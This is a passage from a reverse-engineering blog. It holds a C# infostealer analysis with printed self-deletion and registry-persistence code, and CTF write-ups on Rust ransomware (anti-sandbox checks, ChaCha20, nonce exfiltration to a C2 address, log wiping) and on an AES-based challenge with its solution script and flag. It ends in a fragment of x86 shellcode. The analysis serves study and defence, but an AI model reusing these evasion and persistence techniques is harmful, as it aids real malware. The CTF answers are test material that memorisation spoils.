/Nobreak\u0026#34;); streamWriter2.WriteLine(\u0026#34; Goto l\u0026#34;); streamWriter2.WriteLine(\u0026#34;)\u0026#34;); streamWriter2.WriteLine(\u0026#34;Rmdir /S /Q \\\u0026#34;\u0026#34; + config.InstallPathFixed + \u0026#34;\\\u0026#34;\u0026#34;); streamWriter2.WriteLine(\u0026#34;del /F \\\u0026#34;\u0026#34; + Assembly.GetEntryAssembly().Location + \u0026#34;\\\u0026#34;\u0026#34;); } Process.Start(new ProcessStartInfo { Arguments = \u0026#34;/C \u0026#34; + text + \u0026#34; \u0026amp; Del \u0026#34; + text, WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, FileName = \u0026#34;cmd.exe\u0026#34; }); Environment.Exit(1); } it is very similar to the Install function, almost the same operations\nDeletes the registry keys Deletes the file under C:\\Users\\Ryuzaki\\AppData\\Local\\AdobeUpdater\\svchost.exe and deletes the folder also C:\\Users\\Ryuzaki\\AppData\\Local\\AdobeUpdater\\ using a batch file Deletes the batch file this is used to perform the above deletions startupadd # Launches a hidden command prompt to add to registry key /c reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v GoogleUpdater /t REG_SZ /d C:\\Users\\Ryuzaki\\AppData\\Local\\AdobeUpdater\\svchost.exe /f\ncookiesforce # Syntax : *cookiesforce*\u0026lt;urls, separated with spaces\u0026gt;*\u0026lt;browser name\u0026gt;*\u0026lt;profile name (not a necessary argument)\u0026gt; Less stealthy version of Cookies command where this can try to kill a browser if it\u0026rsquo;s already running to get cookies out of it\nThat is done by setting a bool flag called force to true in the API CookieExtractor.GetCookies\n","date":"25 September 2025","externalUrl":null,"permalink":"/posts/mal_generated30/","section":"Welcome to Posts!","summary":"Contains the malware analysis of the suspicious file \u0026ldquo;GENERATED30\u0026rdquo;","title":"Telegram C2 InfoStealer","type":"posts"},{"content":"tl;dr\nChallenge 2 of Batman Investigation series Ransomware Investigation Rust based Ransomware Analysis with process dump analysis to recover the randomly generated decryption vector and windows malware analysis Recovering from a ransomware attack Challenge Points: 1000 No. of solves: 1 Challenge Author: Azr43lKn1ght\nChallenge Description: # Azrael the Archangel of Vengeance has joined the batfamily after destroying the machine of St Dumas defeating face to face against his most startling foe, the undying heirophant, the first son of St Dumas. The Dumas is not completely destroyed and the heirarchy out somewhere out, Jean Paul, our Azrael has a shared workspace with Duke Thomas, The signal. St Dumas got them now by sending the weapon of azrael but we got the attack process captured by signal as he was the one who let it in unknowingly. Azrael and Signal are trying to fix things to get back whatever is lost as well not get in the clutches of the order. They should now have to safegaurd batman\u0026rsquo;s files as well as their own important ones. if they get it back before Dumas knowing they are getting close to finding them to stop the order as well the birth and training of new Azraels when they are waiting for negotiation or some plan to take our protagonists with hold of the recovery shard. Can you help them to recover from the loses and find the weapon of Azrael ,so they can take down the order of the St Dumas?\nFile Password : E6qK~$9pUIk0kT'3\u0026amp;N/Okt\nChallenge Files:\nPrimary Link Mirror Link Flag format: bi0sctf{...}\nWe\u0026rsquo;ll be starting with question 5 of the challenge cuz that\u0026rsquo;s where the real reversing comes in, so the quesiton 5 is as follows\nQuestion 5 # Q5) What is the ip and port the malware is sending the decryption essential to? Format: ip:port\nso first let\u0026rsquo;s start analysing the mssetup.exe file.\nusing detect it easy we can see that it is packed with upx, let\u0026rsquo;s unpack it\nnow let\u0026rsquo;s check again\nnow it is pretty normal with sections and imports being normal, so we can start static analysis.\nTriaging # Running file on the binary shows it’s a 64 bit PE executable We open the binary in Detect_it_easy, And we can clearly see it is a UPX packed binary, meaning we would have to unpack it first\nCan be done using\nupx -d mssetup.exe\nNow the unpacked binary when put through DIE seems to be normal trying strings on it we see a few intersting strings such as A ransom note looking text 98238588864125956469313398338937 Azr43l_README.txt C:\\Windows\\System32\\winevt\\Logs C:\\Windows\\PrefetchC:\\Windows\\Temp C:\\Users\\Public\\Documents\\Recent C:$Recycle.BinC:\\Windows\\Logs C:\\Windows\\System32\\config C:\\Windows\\SoftwareDistribution USERNAME C:\\UsersDownloadsDesktop0_o AppData\\Roaming\\Notepad++Documents168133: we also see strings pertaining to chacha20, giving us a small idea on what this ransomware might entail\nStatic Analysis # Now we can load the binary into IDA 8.3 Freeware\nAnd we find main fairly easily\nGetting to main # In a rust binary unlike the C/C++ binaries, the main is not actually a main, rather it passes the function pointer of main to another function called lang_start\nAnti Debug Check # Now heading into the actual main we see, An IsDebuggerPresent call\nSo we can easily either NOP out these bytes or convert the jnz to jz as such\nNow this would help us during our debugging session, if we need to step through this function\nLastinputinfo # Next we have this block of code between lines 123 - 130\nGoogling for the struct LASTINPUTINFO\nAs it says, we get a structure filled with the last input info\nThis function fills the dwTime field of the structure with the milliseconds (tick count) of the last input info. The milliseconds here are from the start of system_time\nAnalysing the next block of code, GetTickCount() # We see GetTickCount() being called As mentioned, it returns the number of milliseconds since the system was started, And that is being subtracted from the time the last input was taken and compared against 59999, and is evaluated true if greater. Ie it would be false if it is under 60000ms, 60000ms is 60s i.e 1 min. The malware checks if the computer was idle for the last minute, if it was idle, then it exits . This is one of the conditions For the next block of code above, in the if condition we see it takes a fills a structure plii with the current cursor position and and then sleeps for 5 seconds, then measures the next cursor position and we can see a ‘mm_cmepeq_epi132’ , indicating a compare, thus these two measured cursor positions are compared and if it is the same then it is marked as True, at which point the malware exits and stops running as well.\nOnce the if condition is cleared,\nin the block of code below We see the use of a function “GetAsyncKeyState”\nGetAsyncKeyState() # We can look up the MSDN webpage associated to GetAsyncKeyState\nAs it mentions, it determines which key was pressed during the latest IO operation\nAnd we have GetAsyncKeyState(1) and GetAsyncKeyState(2)\nWhere args 1 and 2 correspond to : Under the virtual key_code\nWe also see, Based on this we can see it keeps track of how many times left click was registered and how many times right click was registered in the variables v1 and v2\nNow we understand that the malware won’t run or proceed further until and unless a particular amount of left and right clicks have been registered which in our case in 6 and 5 respectively\nThis clears out the doubt on why the malware wouldn\u0026rsquo;t run under normal circumstances, and it requires a specific set of actions to be done in a certain number for it to proceed executing the malicious payload\nAfter that we notice some basic initialization type code until line 179 (below)\nAnd tracking that particular offset 140002CFF0 leads us to functions which looks like a heapfree and memory allocation, all of this sounds like basic initialization. So not much use for us to actually reverse this part of the code\nsub_140023030() AKA Unkn_Func_1 # has been rechanged to going into the function it seems too much to sit and revers statically, I\u0026rsquo;ll come back to this later and look at it dynamically\nsub_14000C1B0() AKA Get Environment Variable # Next interesting function is\nThis function seems to take an arguemnt as \u0026ldquo;USERNAME \u0026quot; and a hObject to output the value\nGoing inside the function we see it does make use of the USERNAME argument in calling the windows API So we go with the understanding that the hObject that goes out of this is the ENV VARIABLE\nfilepath setting # this block of code seems like it is reading an existing string(unk_14002D040) at particular offsets and it is appending whatever is read from env_struct to parts of this string\nA hunch we can easily form out of this entire code block is that it is using our system USERNAME to get the correct full path of these directorys\nC:\\Users%USER%\\Downloads\\ C:\\Users%USER%\\Desktop\\ sub_140011F80 mentioned here seems to be taking these Going inside it, we see it basically has a memcpy inside it\nso we aptly can rename sub_140011F80 -\u0026gt;concat\nAlso, we see the output in one is being used in the other after being put through another function sub 140018D50, which just returns the string as is, this can be hunched of as unrwap() in rust\nsub_140005700 just calls a freeheap within itself, so we can rename that as freehap as well\nso now the cleaned up statically analysed block of code looks like And going by the order of the string, I would assume that it is being put to use in the same order that it is stored in\nC:\\Users%USER%\\Downloads\\ C:\\Users%USER%\\Desktop\\ So we can rename the above images/image to kind of fit our mental images/image of what is happening\nRansom_note_file_name # As we can see, first 17 bytes of this offset is read in Create ransom file # when went into the highlighted function, we see calls such as which leads us to understand that this now creates a file under the name\nAzr43l_README.txt.\nAnd we see this being used to the very last concatednated file_path, which under our assumption is Desktop\nWrite ransom note to desktop # In the above images/image we see sub_140004550, we see calls to NtWriteFile\nand this function by itself takes arguments to the ransom_note hence it is safe to assume that it does write the ransom_note onto the newly created Azr43l_README.txt\nThen after this block of code it\u0026rsquo;s mostly a bunch of heap_free calls until line 252\nsub_140017EF0() AKA unkn_func_2 # We see the same routine yet again and some file_path\\Azr43l_README.txt being passed as an arg to the above mnetioned func. We don\u0026rsquo;t understand much from looking into this, this is yet another function to be looked at dynamically\nRansom note drop pt.2 # Starting from line 275 we see a similar routine again of it again wrting the same content to this new file, it\u0026rsquo;s just that it is in a different location (which can be found out dynamically)\nsub_140001450 AKA Unkn_Func_3 # Now we get to what seems to be the crux of the ransomware. We see a new function which we have named unkn_func_2 take in the earlier unkn_func_1\u0026rsquo;s output and it also takes the user_download_folder path, going into the function, it only confuses us even more, so for now we stick to just renaming it like so\nContinuing # As I continued to scroll down more, I saw a similar routine of unwrapping a string and unkn_func_3 being called on them at which point I thought, static analysis is gonna get us only so far, and that we can start looking at the file dynamically\nTraiging pt.2 # Before we start with the dynamic analysis of the ransomware, it would be helpful to debug and get to code faster if we patch out these three key areas\nThe anti debug check as mentioned above The cmp for the number of clicks both 5 and 6 Just for fun I decided to run this binary now, in a controlled environtment ofcourse to see what this does, and as expected so far, we see a ransom note in Desktop and we also see certain files gettting encrypted and being renamed as .azr43l files\nfor example\nDynamic Analysis # NOTE:\nAll the debugging that is being shown in this writeup has been purely done inside and isolted VM. And under no condition, should you try to replicate it on the HOST.\nNow we can start with the dynamic analysis of the ransomware\nBecuase we patched out the above mentioned areas of jnb to respect jb and jz to jnz, debugging is a smooth sail\nwe get to the first function we wanted to look at dynamically\nsub_140023030() AKA Unkn_Func_1 AKA random_24_gen # Initially we just kept track of the output value of this function and func_1_output seems to be generated on runtime\nand when tried to run multiple times, we see different values being generated\nLooking at this we see, it generates\nRandom value 24 bytes so we can go ahead and change the name of the func to Get_env_Variable # Can confirm that it does take the given struct adn does return the %USER% value in the struct\nSetting Filepath # we can confirm those particular file_paths now and we do see the actual path and we can name the variables accordingly\nRansom_note_path # The ransom note path can also be found as shown below C:\\Users\\Ryuzaki\\Desktop\\Azr43l_README.txt Unkn_func_2 # Now we come to unkn_func_2 We see the first arg being some structure, and the second one being the desktop_ransom_note file path We see plii return 1 at the cb.size so it doesn\u0026rsquo;t even enter the block of code under the if condition below\nUnkn_func_3 # Now we come to this part of the code\nas we can see, from renaming the above variables in the \u0026ldquo;setting filepath\u0026rdquo; we get an idea as to what all args are being passed into this function namely\nfile_directory_path (download folder in this case) file_directory_path_len (confirm from debugging) random_generated_val (24 bytes) Statically looking at unkn_func_3 we see a lot of operations pertaining to an encryption of sorts and we see some variables named randombuffer , we see this string 98238588864125956469313398338937 being xorred with something\nand we also see the use of the string .azr43l, as seen above in the second triaging attempt\nSo going based off of these hunches, now I name the current function that we are in right now, unkn_func_3 as encrypt()\nEncrypt() - the heart of the ransomware # Going into encrypt, we come across the first function which takes the file_path and the file_length as arguments, v53 being the output Currently in our case, the file_path is the download folder and the file_length is accordingly set.\nsub_140016D10 # Going inside the above mentioned function, we see\nI have renamed some variables as differently variants of \u0026ldquo;file_path\u0026rdquo; accordingly again and again ,becuase the pointers were being copied and switched around\nAs we keep scrolling down, most of it seem pretty basic and normal assigning operations with nothing much being operated upon. Until this part,\npath file before that particular function call was just our downloadpath file C:\\Users\\%USER%\\Downloads\\\nBut after that call,\nit is appended with a * like so\nAnd in windows * is reserved and is not allowed to be used as an actual file name.\nIt is mostly used to search under a particular directory, a regex the means anything meatching that particular pattern of string. So rn it seems as if that function was supposed to append a * depending on whether or not the pathfile ended in a \u0026ldquo;\u0026quot; character.\nso we rename that function sub_7FF792300B20 like so\nand continue ahead.\nsub_14001A640 AKA convert_to_widechar # takes our file_path as arg and once it exits, we see this when we track our filepath variable hence it has been aptly named\nsub_1400194E0 AKA get_full_path_name # it takes lpfilename and our file_path as argument, and output\u0026rsquo;s the fullpath name under lpfilename\nWhen we look inside the function we see\nand stepping over this function while debugging also confirms the same. In our case it returns the same C:\\Users\\Ryuzaki\\Downloads\\*\nNow coming to next block of code\nFindFirstFileW # We google this on msdn and we FindFirstFileW\nit returns a handle to the file and an output value under the second arguemnt containing information about the file under the structure of FIND_DATAW\ntypedef struct _WIN32_FIND_DATAA { DWORD dwFileAttributes; FILETIME ftCreationTime; FILETIME ftLastAccessTime; FILETIME ftLastWriteTime; DWORD nFileSizeHigh; DWORD nFileSizeLow; DWORD dwReserved0; DWORD dwReserved1; CHAR cFileName[MAX_PATH]; CHAR cAlternateFileName[14]; DWORD dwFileType; // Obsolete. Do not use. DWORD dwCreatorType; // Obsolete. Do not use WORD wFinderFlags; // Obsolete. Do not use } WIN32_FIND_DATAA, *PWIN32_FIND_DATAA, *LPWIN32_FIND_DATAA; The key point to note is this structure contains the filename of the file that it has an info on, so our program is trying to leverage this method of finding every filename inside a given directory\nSO now we can rename the args to more understandable names Next as we keep executing, we see our file_info being copied into the a1 ie our arg1 which we initially thought wld be the output of this particular function as well\nAnd then it returns\nso to summarize,\nbasically this function takes a particular argument, checks if it is a directory, if it is , it would add the \u0026quot; * \u0026quot; operator at the end of the directory and calls FindFirstFileW and gets the file info based on that particular file and returns that in a struct\nSo we name it as as get_file_data\nSuspicious xmmword # Just looking at the assembly side by side\nwe see a bunch of bytes getting copied over into xmm6 and xmm7 , we just keep that in mind and go ahead\nsub_7FF7922FC850 # Not used.\nNext # While debugging we see the memcpy 2\u0026rsquo;s first argument is populated with the filename from get_file_data pointer\nNow in my case it turned out to be another directory that is stored first\nContinuing,\nwe see now the if condition fails at sub_7FF792302070 and goes onto the else condition only to call encrypt function again recrusively Recursive encrypt - iteration 1 # Now are are recrusively inside the encrypt function with the argument as C:\\Users\\Ryuzaki\\Downloads\\DebugView\nwe go through the same steps of finding the first file handle and it\u0026rsquo;s details and names\nFor the purpose of creating this writeup I had made a dummy file under downloads directory and filled it with loerm ipsum content, and now that this file is taken in it passes throuhgh the above function wih no issues, I can form the hunch that the above function sub_7FF792302070 is to check if a particular path is a directory or not\nwe\u0026rsquo;ll go ahead with that\nsub_7FF7922FC6F0() # passing through this function and looking at the value inside RandomBuffer, show\u0026rsquo;s us\ntxt - meaning the function serves it\u0026rsquo;s purpose to find the extension of the loaded file.\nthen this extension is compared against azr43l if the extension is already azr43l then it enters the else condition and looks for more files in the same directory\nand if the extension is not the same then it enters into the if condition\nThis throws more light on the ransomware, that once it encrypts it\u0026rsquo;s files it wld extend it with azr43l\nIn the next check it makes sure it doesn;t encrypt the ransom_note.txt\nif it turns out to be the ransom note then it exits ,looking for the next file in the directory\nnext we see inside this unkn_func_0 we spot it\u0026rsquo;s a CreateFile API\nhence we name this function as create_file\nthen as we go down, we debug more to spot a particular function\nsub_7FF792301E20\nThat seems to return teh filename alone from the huge file path, for example in our case it is - just_a_test_doc\nThen from further debugging we see function calls such as which I have renamed it, because it returns the technical last byte being \u0026ldquo;\\0\u0026rdquo;\nThen it takes the file_name and appends to it the .azr43l extention through these two memcpy\nNext during further debuggin we notice and rename a particular function call that just returns teh current directory path that the file is in\nand that it is getting copied to Random buffer\nNext in the subsequent lines of code\nwe see random buffer being appended to file_directory there_by creating this basically it appends .azr43l to the path of the old filename and it creates a new file_path\nCreating Encrypted File # Now we notice it creates a new handle and opens it to the new encrypted file under the new name of\nC:\\Users\\Ryuzaki\\Downloads\\DebugView\\just_a_test_doc.txt.azr43l\nThen it\u0026rsquo;s just doing a few copies of file pointers which is not really necessary for us atm it provies a malloc space for file_contents then we finally come to reading the file\nOpenfile # Opening the open_file function we see\nhence we name it to be open_file\nnow we can see the file contents as well\nRandom_num_generator # we come across another function which only seems to take two args\nopening it we see,\nSo now we have renamed it as we can see the RandomBuffer is now stored on the stack\nThe actual encryption # We see two function calls here\nsub_7FF7922F8600() and sub_7FF7922F88B0() Coming to the first one\nsub_7FF7922F8600() # sub_7FF7922F8600(\u0026amp;RandomBuffer, \u0026amp;random_buffer, 32LL, random_24_bytes_val, 12LL) The arguments it takes are : Arg 1 and 2 RandomBuffer that we just generated right now\nArg 3 : 32 Arg4: previously generated 24 bytes random value Arg 5 :12\nA major point to note is that this doesn\u0026rsquo;t involve our file_contents at all\nEntering inside this function, this is what it looks like\nwe see strings like chacha20 which certainly do pique an interest here\nWE see another function being called internally\nsub_7FF7922F86C0()\nwhich returns the value in v10\nand now v10 contains expand 32-byte k\ncurious on this we google and a small googling let\u0026rsquo;s us know that this is the initial state of the chacha20 encryption alrogithm\nTherefore now we can rename this funtion as init_chacha20\nAnd googling more about chacha20 in rust gives us this page\nin this we can clearly see that chacha makes use of a 32 byte key(which in our case is random_buffer) and a 12 byte nonce(which in our case is the 24 byte random_val)\nwe keep that in mind that it takes only the top 12 bytes of this 24 byte random_val\nsub_7FF7922F88B0() # Coming to the second function, we now see\nArg1 : expand 32-byte k followed by the random_buffer in memory followed by the first 12 bytes of the 24_byte_val Arg2 : file_contents Arg3 : A number(assuming it\u0026rsquo;s the size of the file) Arg4 : unsure Arg 5: unsure\nThis is arg 1: followed by\nthe 32 byte random value\nfollowed by the 12 byte nonce all of this is on the stack and now this aligns with what we saw in the rust documentation and hence, now we are able to get a clear picture on how and what it is encrypting\nwe basically have the random_val and the nonce that is needed to encrypt and decrypt in chacha20\nEncrypted data # After encryption the location where the 12 byte nonce was stored is where the encrypted data is stored as well, the pointer is being overwritten\nSuspicious xorring # This is pertaining to the earlier suspicious group of bytes that we saw getting pushed into xmm words\nrn the very same byts that are storred in xmm8 and xmm7 are getting xorred with the 32 byte random value that we just generated\nWriting to encrypted file # This xorred value is now being appended to the very end of the file_data that we just encrypted.\nThis helps us recover the randomvalues that were generated for each file\nMeaning, to decrypt now we have got the random_32_byte key we would only require a 12 byte nonce that needs to be used in decrypting\nAnd right now finally as everything goes, we take the encrytped bytes and write it into the new file that we just generated with the .azr43l extension\nDelete old file # Once the new file has been written now, there is no need to keep the original old file around which is now getting deleted from the system\nAnd the rest of this function is just clearing memory spaces and freeing the heap\nAnd thus that brings us to the end of the encrypt function\nOut of Encrypt # After getting out of the encrypt function we continue down into the code\nwe see it assigning new path now, but because it follows the same routine I don\u0026rsquo;t want to bloat the writeup with redundant info\nEncrypting desktop # This block of code encrypts the desktop content\nEncrypting notepad++ # Then it goes onto encrypt C:\\Users\\Ryuzaki\\AppData\\Roaming\\Notepad++\nEncrypting Documents # Encrypts documents twice\nSocketConnection # Now we get to the intersting part again, different from the few previous code blocks\nWe see here what looks like an IP addr\n192.168.1.33\nand right below we seem to have been given the port Now hObject seems to be initialized with ip and port binding them into a single struct for sockets\nas we track hObject we see it is being passed onto which takes the IP , Port and the random_24_byte_val, which we now know to be the nonce\nit sends the nonce to IP 192.168.1.33:6969\nsub_1400024B0() # And last but not least we come to the final function which is yet to be analysed\nGoing into the function we see it has all these strings,\nand we see a bunch of function calls of the same function(sub_1400172B0) but with different strings as different args\nGoing into the function we see a lot of calls\nNtCreateFile GetFileInformationByHandleEx DuplicateHandle GetCurrentProcess\nWe cld have sit and analysed all this, but to save us some time, we cld step over all this functions and go in search for those particular directoris mentioned there such as\nC:\\Windows\\System32\\winevt\\Logs C:\\Windows\\Prefetch C:\\Windows\\Temp C:\\Users\\Public\\Documents\\Recent C:$Recycle.Bin C:\\Windows\\Logs C:\\Windows\\System32\\config C:\\Windows\\SoftwareDistribution And after analysis, it\u0026rsquo;s easy to understand and to formulate a hunch that this particular funtion was meant to remove all the files inside these directories of valuable DFIR artefacts as well for anti-forensic purposes.\nnow as the anlysis is over , we will go ahead and answer the questions\nC2 server IP # 192.168.1.33:6969 ","date":"19 March 2024","externalUrl":null,"permalink":"/posts/bi0sctf_ransomware/","section":"Welcome to Posts!","summary":"\u003cp\u003e\u003cstrong\u003etl;dr\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eChallenge 2 of Batman Investigation series\u003c/li\u003e\n\u003cli\u003eRansomware Investigation\u003c/li\u003e\n\u003cli\u003eRust based Ransomware Analysis with process dump analysis to recover the randomly generated decryption vector and windows malware analysis\u003c/li\u003e\n\u003cli\u003eRecovering from a ransomware attack\u003c/li\u003e\n\u003c/ul\u003e","title":"Rust Ransomware Analysis","type":"posts"},{"content":"tl;dr\nDynamically resolved hashed API Tls_call_back based anti-debug check AntiDebugFlag check implemented using ProcessInformationClass AES_CBC decryption of image to find flag Challenge points: No. of solves: Solved by: retr0ds || AmunRha Challenge Description # You finally manage to remotely connect to a computer onboard the alien vessel to shut down the defense mechanisms. However, it instantly starts acting up and ends up deploying malware as a defense mechanism. All your documents including your hard earned map of the vessel topology is now encrypted. And we are given two files\nChallenge.exe vessel_map.jpeg.owo So, on the base level, it ought to be malware that encrypts files Now we move on to figuring out how.\nTriaging: # Just running the binary inside a VM doesn\u0026rsquo;t seem to affect much inside the binary, nor is trying to pass it as an argument seem to make a difference.\nAnd trying pintools on the binary also seems to result in an error. Hmm, that\u0026rsquo;s odd, seems to have implemented an anti-debug check\nStatic Analysis: # It is UPX packed, so we go ahead and unpack it using upx -d challenge.exe\nNow, load it back again in IDA.\nFunctions: # main\nWe find main() fairly easily, given it\u0026rsquo;s not stripped\nsub_140001080 (AKA) GetFuncByHash Main first calls these functions with an integer value return values are in v4 and v5. And later v4 and v5 are called dynamically as functions. So it is safe for us to assume that this would be a GetFunctionByHash\nsub_1590 Unsure of what it does, we\u0026rsquo;ll keep it aside for now\nv4 and v5 functions The dynamically resolved functions are now called where unkn_array_1 is a byte_array of length 16. We hope to find this out later during the process of debugging to see what are the APIs being called\nsub_140001210 (AKA) Unkn_func_3 This function also employs GetFuncByHash() and calls another API, it is safe to assume v5 might be the return value. This in turn is being used as an argument in the next function call based on the function parameter a1 (a1 passed as v8 in main, is the variable used inside the API called by v5 and v4)\nWe\u0026rsquo;ll get to how and why I named the byte array unkn_16_byte in the next sub_function\nsub_140001290 (AKA) Encrypt_Func\nNow we get to the Function which seems to give us a basic idea of what exactly is being carried out in terms of encryption inside the binary.\nWe seem to check for this directory,\nand a bunch of operations(analyzed below) later we see below a set routine of syscalls OpenFile ReadFile CloseFileHandle\nSome function with two bytearray\u0026rsquo;s as args and v17, v18(the buffers from readfile)\nThen Writefile with v18,v17 as args CloseFileHandle\nSo it is safe to assume and form a HUNCH that,\nIt takes in Two buffers B1 (unkn_16_byte) and B2 (unkn_array_1) each 16 bytes in length Reads from File A Encrypts file_bytes using B1, and B2 under some Encryption Algorithm and stores it into a new file. Both of these B1 and B2 are 16 bytes long and they Also going by the strcpy(), a hunch can be that it stores the filename and is appended the \u0026ldquo;.owo\u0026rdquo; before writing to it. The current hunch is going to be that the encryption algorithm used is AES under CBC mode given it has a key as well as a\nDynamic Analysis # Current Objective:\nGet the debugging process up and running Attaching a debugger and stepping through results in an exception being thrown with error code 0x5 for MEMORY_ACCESS_VIOLATION inside ntdll. Now, that\u0026rsquo;s interesting!! So, the malware author implemented either an existing or a custom anti-debug check method/routine wherein the process can identify if it is being debugged before even it gets to the challenge file\u0026rsquo;s code/the start()\nSo, the program is started by the OS, and during the RT setup, some function checks if there is a presence of a debugger or not.\nNow we go back into the binary and search for \u0026ldquo;Debugger\u0026rdquo; inside functions we get nothing, next thought is to check for it in strings, and Lo and Behold! we are led to Tls_Callback_0\nSo googling about this we get to : Tls_Callback_0_Anti-Debug\nTLS callback is a function that is called before the process entry point executes.\rIf you run the executable with a debugger, the TLS callback will be executed before\rthe debugger breaks. You can see the TLS callback is called by the loader during\rprocess startup. So right now we just patch the assembly from a jz to jnz to let debuggers work through this\nAnd BOOM! now we can enter the user code of the binary.\nObjective : Get the debugging process up and running\nCurrent Objective: Figure out what APIs are being resolved by hashing\nIn main :\nv4() \u0026lt;\u0026mdash;\u0026ndash;\u0026gt; NtAllocateVirtualMemory v5() \u0026lt;\u0026mdash;\u0026ndash;\u0026gt; NtWriteVirtualMemory\nSo it creates a virtual memory space and writes the contents in unkn_array_1 into that memory space\nWe set a Hardware Breakpoint at this place just in case In sub_1210 (AKA) Unkn_func_3 :\nv3() \u0026lt;\u0026mdash;-\u0026gt; NtQueryInformationProcess\nObjective down: Figure out what APIs are being resolved by hashing\nFunction specific reversing: # sub_1590 # Upon debugging we see this function achieves nothing nor does return anything useful under any register, it copies the buffer, runs a while loop for 0x1600 times, set the variable result to that value and returns result.\nsub_140001210 (AKA) Unkn_func_3 # Stepping into this, we found out the API being called is NTQueryInformationProcess, and it returns v5.\nSo we pull up NtQueryInformationProcess\u0026rsquo;s MSDN\nI have a suspicion that this might involve some form of tomfoolery with the PEB structure or ProcessInformationClass given a constant value has been passed on as the second argument\nThe next step was to google and confirm our hunch,\nSearch as such, gives us what we need right in the first link Anti-Debug-Checks\nSo the third argument (ie) v5 is dwProcessDebugFlags, and, if the process is being debugged it would be set to 0, and if not 1\nWith that in mind, we now move on to the next function call inside the binary,\nNow this function is being called by using the first argument as the function pointer, and a1 happens to be the unkn_16_byte (which I assume is either the key or IV), and the second argument is the dwProcessDebugFlag\ndwProcessDebugFlag is 0 if being debugged\ris 1 if not being debugged Now, we know the calling convention of windows functions\nSo we manually change the EDX register value to 1 and continue execution by hitting f7\nnow converting it all to code,\nwe see it makes use of xmmwords (128-bit registers) to do some operations\nWe are unsure of such opcodes, but our goal rn is to retrieve the unkn_16_byte array as if the program was never debugged.\nAnd we seem to easily accomplish that by just passing through the instructions and finally examining the RCX value before the return.\nWe get the unkn_16_byte array to be 6D597133733676397924422645294840\nsub_1290 (AKA) EncryptFunc # This function seems to get the HANDLE to the first file under \u0026ldquo;C:\\Users\\Administrator\\Documents\\\u0026rdquo;\nThen it goes onto this part of the code The above snippet is responsible for just copying over the file path string from the buffer to the variables. Unimportant.\nThis above part of the code is responsible for converting the filename to UTF-8 from UTF-16(Microsoft/Windows stores text in the form of UTF-16 to ensure broader encompassing of symbols/characters, this is AKA wide char where each character is given a set space of 2 bytes,in the event only a single byte is used, the unused byte is nulled out)\nThen the UTF-8 converted text is put in the routine of\nOPEN\rREAD\rCLOSE\r\u0026lt;ENCRYPT\u0026gt;\rOPEN\rWRITE\rCLOSE The Core # And now we get to the core of the binary This encrypt function determines the entire functionality purpose of the binary\nBefore going into the function, we see it takes in the unkn_16_byte we retrieved and another array with just the null bytes(chances for it being the IV incase this is AES)\nNow we step into the function, by hitting f7 we get bytes, we continue hitting c to convert it to code and p to define it as a function in IDA\nOnce we are a couple of functions in, we notice\nChecking out the byte array,\nWe see it is exactly the S-box used in AES.\nNow we have confirmed the encryption algorithm being used as well by taking a step-by-step approach.\nAll we have left is to decrypt the given .owo file and that should give us the FLAG\nThe Script # from Crypto.Cipher import AES f1 = open(\u0026#34;flag.png\u0026#34;,\u0026#34;wb\u0026#34;) x = AES.new((key=b\u0026#39;mYq3s6v9y$B\u0026amp;E)H@\u0026#39;, mode=AES.MODE_CBC, iv=b\u0026#39;\\x00\u0026#39;*16) f2 = open(\u0026#34;vessel_map.jpeg.owo\u0026#34;, \u0026#34;rb\u0026#34;) bytes = f2.read() f1.write(x.decrypt(bytes)) key = b'mYq3s6v9y$B\u0026amp;E)H@' is our unkn_16_byte in bytes format iv = 16 null bytes (ie) \u0026lsquo;\\x00\u0026rsquo; * 16\nOR\nWe can use CyberChef To retrieve the flag file\nThe Flag # HTB{573pp1ng_1n70_und0cum3n73d_4113n_4p15}\n","date":"24 March 2023","externalUrl":null,"permalink":"/posts/vessel_cartographer_htb2023/","section":"Welcome to Posts!","summary":"\u003cp\u003e\u003cstrong\u003etl;dr\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eDynamically resolved hashed API\u003c/li\u003e\n\u003cli\u003eTls_call_back based anti-debug check\u003c/li\u003e\n\u003cli\u003eAntiDebugFlag check implemented using ProcessInformationClass\u003c/li\u003e\n\u003cli\u003eAES_CBC decryption of image  to find flag\u003c/li\u003e\n\u003c/ul\u003e","title":"Vessel Cartographer HTBCTF23","type":"posts"},{"content":"","date":"25 November 2025","externalUrl":null,"permalink":"/tags/analysis/","section":"Tags","summary":"","title":"Analysis","type":"tags"},{"content":"","date":"25 November 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"25 November 2025","externalUrl":null,"permalink":"/tags/malware/","section":"Tags","summary":"","title":"Malware","type":"tags"},{"content":"","date":"25 November 2025","externalUrl":null,"permalink":"/categories/malware/","section":"Categories","summary":"","title":"Malware","type":"categories"},{"content":"","date":"25 November 2025","externalUrl":null,"permalink":"/tags/rat/","section":"Tags","summary":"","title":"RAT","type":"tags"},{"content":"","date":"25 November 2025","externalUrl":null,"permalink":"/tags/remcos/","section":"Tags","summary":"","title":"Remcos","type":"tags"},{"content":"","date":"25 November 2025","externalUrl":null,"permalink":"/","section":"retr0ds_blog","summary":"","title":"retr0ds_blog","type":"page"},{"content":"","date":"25 November 2025","externalUrl":null,"permalink":"/tags/reverse-engineering/","section":"Tags","summary":"","title":"Reverse Engineering","type":"tags"},{"content":"","date":"25 November 2025","externalUrl":null,"permalink":"/categories/reversing/","section":"Categories","summary":"","title":"Reversing","type":"categories"},{"content":"","date":"25 November 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"Contains all my posts organized year wise\n","date":"25 November 2025","externalUrl":null,"permalink":"/posts/","section":"Welcome to Posts!","summary":"Learn more about me and why I am starting this blog.","title":"Welcome to Posts!","type":"posts"},{"content":"","date":"27 March 2024","externalUrl":null,"permalink":"/tags/blog/","section":"Tags","summary":"","title":"Blog","type":"tags"},{"content":"","date":"27 March 2024","externalUrl":null,"permalink":"/tags/pop_a_calc/","section":"Tags","summary":"","title":"Pop_a_calc","type":"tags"},{"content":" Writing the Shellcode x86 W32 # 32 bit also goes through the same steps as 64 bits so I woudn\u0026rsquo;t be explaining it in detail rather, I have commented it on the side for you to understand and pick up based on context from x64\nxor eax, eax\rxor ebx, ebx\rmov ebx, [fs:ebx + 0x030] ; PEB loaded in eax\rmov ebx, [ebx + 